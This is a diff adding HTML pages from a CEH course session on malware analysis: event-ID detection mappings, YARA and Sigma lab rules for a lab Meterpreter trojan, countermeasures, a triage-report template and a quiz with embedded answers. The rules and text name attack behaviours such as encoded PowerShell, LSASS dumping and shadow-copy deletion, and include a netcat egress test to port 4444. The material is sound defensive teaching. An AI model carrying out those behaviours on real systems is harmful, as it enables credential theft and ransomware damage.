+      <p class="lede">You analysed all afternoon. Here is the defender&#39;s view &mdash; the handful of events that betray each malware behaviour you watched.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Analysis and detection are the same knowledge</span><p>Everything you observed in dynamic analysis has a <strong>log-side twin</strong>. The process spawn, the persistence write, the LSASS access, the beacon &mdash; each is a specific event a rule can key on. Learn the pairs and the analyst becomes the detection engineer. Click each.</p></div>
+      <figure class="dgm interactive">
+        <svg viewBox="0 0 940 300" role="img" aria-label="Interactive map: four malware behaviours in orange on the left, each paired with the defender evidence in green on the right. Click each.">
+          <text x="235" y="26" text-anchor="middle" font-size="13" class="d-title" fill="#ff7043">MALWARE did</text>
+          <text x="705" y="26" text-anchor="middle" font-size="13" class="d-title" fill="#4ade80">SOC sees</text>
+          <line x1="470" y1="40" x2="470" y2="286" stroke="#333b4c" stroke-width="1.2" stroke-dasharray="3 4"/>
+          <g class="node" data-node="exec" tabindex="0"><rect x="20" y="48" width="430" height="52" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="38" y="70" font-size="12">Trojan runs / Office spawns a shell</text><text class="d-sub" x="38" y="90" class="d-mono">winword.exe &rarr; powershell -enc</text></g>
+          <rect x="490" y="48" width="430" height="52" rx="8" fill="#12241c" stroke="#4ade80"/><text class="d-lbl" x="508" y="70" font-size="13" fill="#4ade80" class="d-mono">Sysmon 1 / 4688</text><text class="d-sub" x="640" y="70">process create</text><text class="d-sub" x="508" y="90">odd parent&rarr;child tree is the tell</text><path d="M450,74 L488,74" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
+          <g class="node" data-node="pers" tabindex="0"><rect x="20" y="112" width="430" height="52" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="38" y="134" font-size="12">Persistence written (survive reboot)</text><text class="d-sub" x="38" y="154" class="d-mono">Run key / scheduled task / service</text></g>
+          <rect x="490" y="112" width="430" height="52" rx="8" fill="#12241c" stroke="#4ade80"/><text class="d-lbl" x="508" y="134" font-size="13" fill="#4ade80" class="d-mono">Sysmon 13 / 7045</text><text class="d-sub" x="640" y="134">reg-set / service install</text><text class="d-sub" x="508" y="154">binary in a user-writable path = tell</text><path d="M450,138 L488,138" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
+          <g class="node" data-node="c2" tabindex="0"><rect x="20" y="176" width="430" height="52" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="38" y="198" font-size="12">Beacon home (C2)</text><text class="d-sub" x="38" y="218" class="d-mono">outbound 443 to a rare host, on a timer</text></g>
+          <rect x="490" y="176" width="430" height="52" rx="8" fill="#12241c" stroke="#4ade80"/><text class="d-lbl" x="508" y="198" font-size="13" fill="#4ade80" class="d-mono">Sysmon 3</text><text class="d-sub" x="600" y="198">network connect</text><text class="d-sub" x="508" y="218">rare dest + regular interval = beacon</text><path d="M450,202 L488,202" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
+          <g class="node" data-node="imp" tabindex="0"><rect x="20" y="240" width="430" height="46" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="38" y="262" font-size="12">Ransomware / cred theft (impact)</text><text class="d-sub" x="38" y="279" class="d-mono">vssadmin delete · lsass access</text></g>
+          <rect x="490" y="240" width="430" height="46" rx="8" fill="#12241c" stroke="#4ade80"/><text class="d-lbl" x="508" y="260" font-size="12.5" fill="#4ade80">Sysmon 10 · mass file-write</text><text class="d-sub" x="508" y="278">lsass ProcessAccess; thousands of writes/min</text><path d="M450,263 L488,263" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
+        </svg>
+        <div class="dgm-hint">Click each &mdash; the exact event, and the field a Lab D rule keys on.</div>
+        <div class="dgm-detail" data-detail="exec"><h5><span class="dd-tag">T1059 · EXECUTION &rarr; Sysmon 1 / 4688</span>The parent-child tell</h5><p><b>Process-create events where the tree is wrong:</b> <span class="mono">winword.exe</span> or <span class="mono">excel.exe</span> spawning <span class="mono">powershell.exe</span>/<span class="mono">cmd.exe</span>, especially with <span class="mono">-enc</span>. Rule: Office app as parent of a script interpreter. Script Block Logging (4104) decodes the payload.</p></div>
+        <div class="dgm-detail" data-detail="pers"><h5><span class="dd-tag">T1547 / T1543 · PERSISTENCE &rarr; 13 / 7045</span>It wrote itself in</h5><p><b><span class="mono">Sysmon 13</span> (registry value set) on a <span class="mono">...\CurrentVersion\Run</span> key, or <span class="mono">7045</span> (service installed).</b> The tell is the target path &mdash; a binary in <span class="mono">%TEMP%</span>/<span class="mono">%APPDATA%</span> or an unsigned autorun. Rule: autorun write pointing at a user-writable location.</p></div>
+        <div class="dgm-detail" data-detail="c2"><h5><span class="dd-tag">T1071 · C2 &rarr; Sysmon 3</span>The beacon pattern</h5><p><b><span class="mono">Sysmon 3</span> (network connect) to a rare external host on a regular interval.</b> One connection is nothing; the <em>periodicity</em> and the <em>rare destination</em> make the beacon. Enrich with proxy logs (young domain, odd user-agent, JA3). Rule: repeated connects to a low-prevalence destination.</p></div>
+        <div class="dgm-detail" data-detail="imp"><h5><span class="dd-tag">T1486 / T1003 · IMPACT &rarr; Sysmon 10 / file volume</span>The crown-jewel alerts</h5><p><b>Credential theft: <span class="mono">Sysmon 10</span> ProcessAccess to <span class="mono">lsass.exe</span> with a dump mask (0x1010/0x1410).</b> Ransomware: a single process rewriting thousands of files per minute plus <span class="mono">vssadmin delete shadows</span>. Both are near-certain, high-value detections &mdash; the ones you write first.</p></div>
+      </figure>
+      <div class="box key-takeaway"><span class="box-t">Analysis is detection engineering</span><p><strong class="hl hl-d">Every behaviour you watched has an event ID.</strong> The best single rules of the day are <b>LSASS access (Sysmon 10)</b>, <b>Office&rarr;encoded-PowerShell</b>, and <b>vssadmin delete shadows</b>. You will write two of them next.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Lab D: write the rules">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S07 &middot; P23</span><span class="tag lab">Hands-on &middot; everyone &middot; the signature exercise</span><span class="time">&#9201; 18 min</span></div>
+      <h1>Lab D &mdash; Detect the Malware You Analysed</h1>
+      <p class="lede">Turn your own analysis into working detections: a YARA rule for the file and a Sigma rule for the behaviour. This is the session&#39;s core skill.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Why this is the defining exercise</span><p>You have a sample and its behaviour on record. Now write the two rules that would have caught it &mdash; a <strong>YARA</strong> rule matching its content and a <strong>Sigma</strong> rule matching its behaviour in logs. File-side and log-side together give coverage the attacker cannot dodge by re-encoding one and not the other.</p></div><div class="box warn"><span class="box-t">Use your own IOC sheet from Labs B&ndash;C</span><p>You need the strings/imports from Lab B and the process/connection behaviour from Lab C. No lab? The fallbacks (<span class="mono">saved/</span>) contain a sample IOC sheet and event log.</p></div>
+      <h2><span class="h-t">Rule 1 &mdash; YARA (file content)</span></h2>
+      <p>Match the sample by a <em>combination</em> of distinctive content &mdash; specific enough not to fire on benign files.</p>
+      <pre><code>rule Session7_Lab_Trojan {
+  meta:
+    author = "soc-student"
+    desc   = "lab meterpreter trojan — session 7"
+    ref    = "attack.t1071.001"
+  strings:
+    $mz   = { 4D 5A }                 // PE magic at offset 0
+    $ws   = "ws2_32.dll" ascii nocase // networking capability
+    $c2   = "192.168.56.101" ascii    // recovered C2 (adjust to yours)
+  condition:
+    $mz at 0 and $ws and $c2          // PE + sockets + this C2 = our family
+}
+
+// hunt across a tree:
+yara -r session7_lab.yar /samples/</code></pre>
+      <h2><span class="h-t">Rule 2 &mdash; Sigma (behaviour in logs)</span></h2>
+      <p>Catch the <em>behaviour</em> even if the file is re-encoded: an unsigned binary in a user-writable path making an outbound connection.</p>
+      <pre><code>title: Suspicious Outbound From User-Writable Path
+logsource:
+  product: windows
+  category: network_connection      # Sysmon Event ID 3
+detection:
+  selection:
+    Initiated: 'true'
+    Image|startswith:
+      - 'C:\Users\'
+      - 'C:\Windows\Temp\'
+      - 'C:\ProgramData\'
+  filter_ports:
+    DestinationPort:
+      - 80
+      - 443
+  condition: selection and filter_ports
+tags: [attack.command_and_control, attack.t1071.001]
+level: medium</code></pre>
+      <ol class="steps">
+<li>
+<b>Write the YARA rule</b> from your Lab B strings and validate it fires only on the sample:
+<pre><code>yara session7_lab.yar /tmp/lab/invoice_2026.exe   # should MATCH
+yara session7_lab.yar /usr/bin/                    # should NOT match benign files</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>A rule that matches the sample and <em>not</em> your <span class="mono">/usr/bin</span> is well-scoped &mdash; specific patterns + a combining condition avoid false positives.</li></ul></div>
+</li>
+<li>
+<b>Reason about the Sigma rule</b>: which of your Lab C observations does it key on, and how would you tighten it?
+<pre><code># Lab C gave you: invoice_2026.exe in a user path -> outbound 443.
+# The rule fires on that shape. Tighten with: Image not signed, or add a beacon-interval
+# correlation so you alert on the REPEATED connect, not a single one.</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>You mapped a real observed behaviour to a log rule and identified how to cut its false positives &mdash; the actual daily work of a detection engineer.</li></ul></div>
+</li>
+<li>
+<b>Map each rule to ATT&amp;CK</b> so the alert tells the next analyst what it means:
+<pre><code># YARA  Session7_Lab_Trojan  -> T1071.001 (Web C2)
+# Sigma outbound-from-user-path -> T1071.001 (Web C2)
+# a fired alert now carries its technique — self-documenting detection</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>Both rules carry their technique tag, so an alert is self-explanatory. This is why you mapped to ATT&amp;CK on P18.</li></ul></div>
+</li>
+</ol>
+      <div class="box key-takeaway"><span class="box-t">Two rules, full coverage</span><p><strong class="hl hl-d">YARA catches the file; Sigma catches the behaviour.</strong> Re-encoding beats the hash and maybe the YARA strings &mdash; but the behavioural Sigma rule still fires. Layered detection is how you catch the variant you have never seen.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Countermeasures">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S07 &middot; P24</span><span class="tag defensive">Defensive &middot; defense in depth</span><span class="time">&#9201; 6 min</span></div>
+      <h1>Countermeasures &mdash; Break the Lifecycle at Every Stage</h1>
+      <p class="lede">No single control stops malware. You place a barrier at each lifecycle stage so that when one fails, the next catches it.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Map controls to the lifecycle</span><p>You learned the five-stage lifecycle on P4. Defence in depth means putting a control at <strong>every</strong> stage, so the attacker has to beat all of them, not one. Miss delivery? Block execution. Miss execution? Catch persistence or the beacon. This is why layered defence works even against novel samples.</p></div>
+      <div class="tbl-scroll">
+      <table><colgroup><col style="width:15%"><col style="width:48%"><col style="width:37%"></colgroup>
+      <thead><tr><th>Lifecycle stage</th><th>Control that breaks it</th><th>Why it works</th></tr></thead>
+      <tbody>
+      <tr><td>Delivery</td><td>email filtering + attachment sandboxing; block macros from the internet; user awareness</td><td>most malware still arrives by phish &mdash; stop it before it lands</td></tr>
+      <tr><td>Execution</td><td>application allow-listing (WDAC/AppLocker); disable Office macros; SmartScreen</td><td>if only known-good can run, the trojan never starts</td></tr>
+      <tr><td>Persistence</td><td>monitor autoruns/services (Sysmon 13/7045); least privilege</td><td>persistence is loud and rare &mdash; a high-signal detection point</td></tr>
+      <tr><td>C2</td><td>egress filtering; DNS filtering; proxy inspection; beacon detection</td><td>cut the callback and a RAT is deaf and dumb</td></tr>
+      <tr><td>Actions / Impact</td><td>offline + immutable backups; segmentation; EDR behavioural blocking; LSASS protection (Credential Guard)</td><td>limits blast radius and guarantees ransomware recovery without paying</td></tr>
+      <tr><td>Across all</td><td>patch (EternalBlue!); EDR/AV with real-time protection; least privilege; logging + a SOC that reads it</td><td>the fundamentals that make every stage above harder</td></tr>
+      </tbody></table></div>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; check the two controls that stop the most malware</span><pre><code># 1) Are macros from the internet blocked? (stops a huge share of delivery+execution)
+#    Group Policy: 'Block macros from running in Office files from the Internet' = Enabled
+# 2) Is egress filtering on? Try to reach a random high port outbound:
+nc -zv example.com 4444    # in a hardened net this should be BLOCKED — killing reverse shells</code></pre><p style="margin-top:8px"><b>You should see:</b> two controls &mdash; macro-blocking and egress filtering &mdash; defeat a large fraction of real intrusions (delivery/execution and C2). Cheap, high-impact, and the ones orgs most often skip.</p></div><div class="box key-takeaway"><span class="box-t">A barrier at every stage</span><p><strong class="hl hl-d">Defence in depth beats novelty.</strong> You cannot predict the next sample, but you can guarantee it must pass delivery, execution, persistence, C2, <em>and</em> impact controls. Offline backups + egress filtering + app-allow-listing + patching stop most of what you will ever see.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Lab E: the report">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S07 &middot; P25</span><span class="tag lab">Hands-on &middot; deliverable</span><span class="time">&#9201; 20 min</span></div>
+      <h1>Lab E &mdash; Write the Incident Triage Report</h1>
+      <p class="lede">Everything you produced today becomes one document: what the sample is, what it did, mapped to ATT&amp;CK, with IOCs and the rules to catch it.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">The analyst&#39;s real output</span><p>An analysis nobody can act on is wasted. The deliverable is a <strong>triage report</strong>: a clear story a responder and a manager can both use. It states what the sample is, walks its behaviour along the lifecycle, maps each step to ATT&amp;CK, lists IOCs by durability, and hands over the YARA/Sigma rules. This is what a SOC actually ships.</p></div>
+      <ol class="steps">
+<li>
+<b>Summary &amp; verdict</b> &mdash; the part a manager reads:
+<pre><code># Sample: invoice_2026.exe  sha256: <hash>
+# Verdict: MALICIOUS — Windows trojan / Meterpreter RAT
+# Impact: remote control via C2 192.168.56.101:443; would enable follow-on theft/ransomware
+# Confidence: high (static + dynamic + known family)</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>A one-paragraph verdict with confidence and impact &mdash; the decision-maker&#39;s view before any technical detail.</li></ul></div>
+</li>
+<li>
+<b>Behaviour along the lifecycle</b>, each step with its ATT&amp;CK ID (from P18):
+<pre><code># Execution   T1204/T1059  user ran a disguised exe
+# C2          T1071.001    outbound 443 to 192.168.56.101 (confirmed, Lab C)
+# (Persistence T1547.001   if a Run-key write was observed)
+# Capability inferred from imports: ws2_32 sockets, remote shell</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>The technical timeline: what it did, in order, in the shared ATT&amp;CK language any analyst can act on.</li></ul></div>
+</li>
+<li>
+<b>IOCs by durability</b> (from P19) so responders know what to block and for how long:
+<pre><code># HOST:    sha256 <hash>; filename invoice_2026.exe
+# NETWORK: 192.168.56.101:443  (C2)
+# TTP:     unsigned exe in user path -> outbound 443 + Run-key persistence</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>Indicators ranked so the team blocks the cheap ones now and hunts the durable behaviour long-term.</li></ul></div>
+</li>
+<li>
+<b>Detections &amp; recommendations</b> &mdash; hand over the rules and the fixes:
+<pre><code># Detections: attach Session7_Lab_Trojan.yar + the Sigma outbound rule (Lab D)
+# Containment: isolate host, block C2 at proxy, reset exposed creds
+# Hardening: block internet macros, egress filtering, app allow-listing (P23)</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>The report ends in <em>action</em>: rules to deploy, host to contain, controls to add. This is the difference between analysis and response.</li></ul></div>
+</li>
+</ol>
+      <div class="box do"><span class="box-t">Deliverable</span><p>Produce the report as a one-to-two page document using the template in <span class="mono">exercises/session-07/incident_triage_template.md</span>. It is the artifact you would hand to an IR lead &mdash; and the capstone of this session.</p></div><div class="box key-takeaway"><span class="box-t">Analysis becomes action</span><p><strong class="hl">The report is the job.</strong> Verdict, behaviour, ATT&amp;CK, IOCs, detections, hardening &mdash; six sections that turn an afternoon of analysis into something a team can act on tonight.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Where next">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S07 &middot; P26</span><span class="tag resources">Practice &middot; keep going</span><span class="time">&#9201; 5 min</span></div>
+      <h1>Practice Range &mdash; Malware Analysis</h1>
+      <p class="lede">Free rooms and safe sample sources to turn today&#39;s workflow into a reflex. Do at least one this week.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Build the muscle memory</span><p>You have the workflow &mdash; hash, strings, imports, detonate, map, rule, report. It becomes fast only with reps. These free TryHackMe rooms drill exactly this, and the sample sources let you practise safely on real families in a proper sandbox.</p></div>
+      <div class="rooms"><a class="room" href="https://tryhackme.com/room/basicmalwarere" target="_blank" rel="noopener"><span class="room-tag free">FREE</span><span class="room-name">Basic Malware RE</span><span class="room-meta">reverse-engineering warm-up &middot; strings, PE, simple analysis</span><span class="room-note">Verified free &mdash; hands-on static analysis, the Lab B skillset.</span></a><a class="room" href="https://tryhackme.com/room/historyofmalware" target="_blank" rel="noopener"><span class="room-tag free">FREE</span><span class="room-name">History of Malware</span><span class="room-meta">the families behind the concepts &middot; context</span><span class="room-note">Verified free &mdash; the real-world samples that made each class famous.</span></a><a class="room" href="https://tryhackme.com/room/malmalintroductory" target="_blank" rel="noopener"><span class="room-tag freetier">FREE (rank)</span><span class="room-name">MAL: Malware Introductory</span><span class="room-meta">the analyst workflow end-to-end &middot; static + dynamic</span><span class="room-note">Popular intro room &mdash; confirm it is free on the day; mirrors this whole session.</span></a>
+      </div><div class="box do"><span class="box-t">Safe sample sources (sandbox only)</span><p>Practise on <strong>real</strong> families only inside your isolated chamber: <span class="mono">MalwareBazaar</span> (abuse.ch) for tagged samples, <span class="mono">theZoo</span> for a curated teaching set, and <span class="mono">Hybrid-Analysis</span> / <span class="mono">Any.Run</span> for online detonation when you cannot build a local sandbox. Never download a live sample to a machine you care about.</p></div><div class="box warn"><span class="box-t">The one rule that never changes</span><p><strong>Live malware runs only in the burn-it chamber.</strong> Snapshot, isolate the network, arm the tools &mdash; every time. The workflow is safe; skipping isolation is what turns practice into an incident.</p></div><div class="box key-takeaway"><span class="box-t">Reps make it a reflex</span><p><strong class="hl">One room this week.</strong> The workflow you did once today should become the thing your hands do automatically &mdash; that only comes from analysing samples whose answers you can check.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Knowledge check">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S07 &middot; P27</span><span class="tag assess">Assess &middot; 6 questions</span><span class="time">&#9201; 10 min</span></div>
+      <h1>Knowledge Check</h1>
+      <p class="lede">Six questions across the session. Answer before you reveal &mdash; each explains the reasoning, not just the letter.</p>
+    </div>
+    <div class="content">
+<div class="quiz"><div class="q mcq" data-correct="c" data-why="A worm self-propagates with no user interaction; a virus needs a user to run the infected host file. That difference drives outbreak speed and containment (segmentation/patching vs. stopping execution).">
+  <p><span class="qn">Q1</span>What is the defining difference between a worm and a virus?</p>
+  <ul class="opts"><li data-opt="a">A worm encrypts files; a virus steals credentials</li><li data-opt="b">A worm is fileless; a virus is always on disk</li><li data-opt="c">A worm spreads by itself across the network; a virus needs a user to run an infected file</li><li data-opt="d">There is no real difference &mdash; the terms are interchangeable</li></ul>
+  <div class="mcq-fb"></div>
+</div><div class="q mcq" data-correct="b" data-why="Static analysis examines the file without running it (hash, strings, imports) — zero execution risk, so it is always step one. Dynamic analysis runs the sample and must happen in an isolated sandbox.">
+  <p><span class="qn">Q2</span>Why do you always perform static analysis before dynamic analysis?</p>
+  <ul class="opts"><li data-opt="a">Static analysis is more accurate than dynamic</li><li data-opt="b">Static analysis never executes the file, so it carries no risk &mdash; you learn safely first</li><li data-opt="c">Dynamic analysis is illegal without static analysis first</li><li data-opt="d">Static analysis unpacks the malware automatically</li></ul>
+  <div class="mcq-fb"></div>
+</div><div class="q mcq" data-correct="d" data-why="A near-empty import table (just LoadLibrary/GetProcAddress) means the real imports are resolved at runtime — the hallmark of a packed/obfuscated sample, which pushes you toward dynamic analysis.">
+  <p><span class="qn">Q3</span>During static analysis a PE has almost no imports &mdash; just LoadLibrary and GetProcAddress. What does this most likely indicate?</p>
+  <ul class="opts"><li data-opt="a">The file is benign &mdash; it does nothing</li><li data-opt="b">The file is a document, not an executable</li><li data-opt="c">The file is a rootkit</li><li data-opt="d">The file is packed/obfuscated &mdash; real imports are hidden until runtime</li></ul>
+  <div class="mcq-fb"></div>
+</div><div class="q mcq" data-correct="a" data-why="Sysmon Event ID 10 (ProcessAccess) on lsass.exe with a dump-style GrantedAccess mask is the classic credential-theft (Mimikatz) signal — almost nothing legitimate opens LSASS that way. Maps to T1003.001.">
+  <p><span class="qn">Q4</span>Which single detection best catches credential dumping (Mimikatz-style)?</p>
+  <ul class="opts"><li data-opt="a">Sysmon Event ID 10 &mdash; a process opening lsass.exe with a read/dump access mask</li><li data-opt="b">Event 4624 &mdash; a successful logon</li><li data-opt="c">A file hash blocklist</li><li data-opt="d">Sysmon Event ID 3 &mdash; any network connection</li></ul>
+  <div class="mcq-fb"></div>
+</div><div class="q mcq" data-correct="c" data-why="On the Pyramid of Pain, TTPs/behaviours are hardest for an attacker to change and so give the most durable detection; a file hash changes with a single byte and is the most brittle.">
+  <p><span class="qn">Q5</span>You want the most durable detection for a malware family. Which indicator do you invest in?</p>
+  <ul class="opts"><li data-opt="a">The exact file hash &mdash; it is precise</li><li data-opt="b">The dropped filename</li><li data-opt="c">The behaviour / TTP (e.g. Office spawning encoded PowerShell) &mdash; expensive to change</li><li data-opt="d">The compile timestamp</li></ul>
+  <div class="mcq-fb"></div>
+</div><div class="q mcq" data-correct="b" data-why="vssadmin delete shadows runs before mass encryption to destroy recovery options — so a rule on it is an early-warning that can fire while files are still intact. It is one of the most reliable ransomware behaviours.">
+  <p><span class="qn">Q6</span>Why is a detection rule on 'vssadmin delete shadows' so valuable against ransomware?</p>
+  <ul class="opts"><li data-opt="a">It is the encryption command itself</li><li data-opt="b">It runs before encryption to kill backups &mdash; catching it can save the data</li><li data-opt="c">It is the ransom-note filename</li><li data-opt="d">It only appears in fileless malware</li></ul>
+  <div class="mcq-fb"></div>
+</div></div><div class="box key-takeaway"><span class="box-t">Score yourself</span><p><strong class="hl">5&ndash;6 right:</strong> you can run the workflow &mdash; go analyse a real sample in a sandbox. <strong>3&ndash;4:</strong> re-read the static/dynamic and IOC pages. <strong>&lt;3:</strong> rewatch the lifecycle and SOC-flip diagrams &mdash; they anchor everything else.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Takeaways">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S07 &middot; P28</span><span class="tag summary">Wrap-up</span><span class="time">&#9201; 4 min</span></div>
+      <h1>Session 7 &mdash; What You Keep</h1>
+      <p class="lede">Ten things that outlast the tool names. Malware changes weekly; this workflow does not.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">The durable core</span><p>You sat in both chairs on one sample: built it, analysed it two ways, mapped it, and wrote the rules to catch it. The tools will change; the discipline &mdash; classify by behaviour, static-then-dynamic, map to ATT&amp;CK, detect the behaviour &mdash; is what you keep.</p></div>
+      <ol class="takeaways">
+        <li><strong>Classify by behaviour, not by name.</strong> Propagation &times; purpose places any sample and tells you what evidence to hunt.</li>
+        <li><strong>One lifecycle fits all malware.</strong> Delivery &rarr; execution &rarr; persistence &rarr; C2 &rarr; actions &mdash; and every stage leaves evidence.</li>
+        <li><strong>Reverse = victim dials out.</strong> RATs beat firewalls with outbound C2; egress filtering and beacon detection catch them.</li>
+        <li><strong>Worm = no click = outbreak.</strong> Contain with segmentation and patching; you cannot out-click an exponential curve.</li>
+        <li><strong>Ransomware is loud on purpose.</strong> Mass file-rewrite + <span class="mono">vssadmin delete shadows</span> is one of the most catchable behaviours there is.</li>
+        <li><strong>You cannot hash what is not on disk.</strong> Fileless/LOLbins force behavioural detection &mdash; command lines and process trees.</li>
+        <li><strong>Static first (safe), dynamic second (isolated).</strong> Static says what it is; dynamic proves what it does; packing forces the truth out at runtime.</li>
+        <li><strong>Map to ATT&amp;CK.</strong> A mapped behaviour is a detection checklist every analyst on earth can read.</li>
+        <li><strong>Climb the Pyramid of Pain.</strong> Block the hash today; detect the behaviour forever.</li>
+        <li><strong>Analysis is detection engineering.</strong> Every behaviour you watched has an event ID &mdash; YARA for the file, Sigma for the behaviour, a report that ships both.</li>
+      </ol><div class="box bridge"><span class="box-t">Next &mdash; Session 8</span><p>You have met the payload and learned to take it apart. Session 8 goes to where most of it gets delivered from in the first place: <strong>web applications</strong> &mdash; the technology, the enumeration, and the injection flaws (XSS, file upload, and the big one, <strong>SQL injection</strong>) that hand attackers the initial foothold.</p></div><div class="box key-takeaway"><span class="box-t">The through-line</span><p><strong class="hl">Attack informs defence.</strong> You built the malware to understand it, and understanding it is exactly what let you write the rules to catch it. That is the whole discipline &mdash; and it is now yours.</p></div>
+    </div>
+  </section>
+
+  <div class="pagenav">
+    <a href="#" id="btnPrev"><small>Previous</small><span class="lbl">&mdash;</span></a>
+    <a href="#" id="btnNext" class="next"><small>Next</small><span class="lbl">&mdash;</span></a>
+  </div>
+  <p class="kbd-hint">Navigate with <span class="kbd">&larr;</span> <span class="kbd">&rarr;</span> arrow keys ·
+     <span class="kbd">Home</span> / <span class="kbd">End</span> to jump</p>
+
+  </article>
+</div>
+</div>
+
+<footer class="site-foot">
+  <div class="wrap"><p>CEH Diploma · ITGate Academy · Session 07 — Malware Threats & Analysis</p></div>
+</footer>
+
+<script src="../assets/js/session.js"></script>
+</body>
+</html>
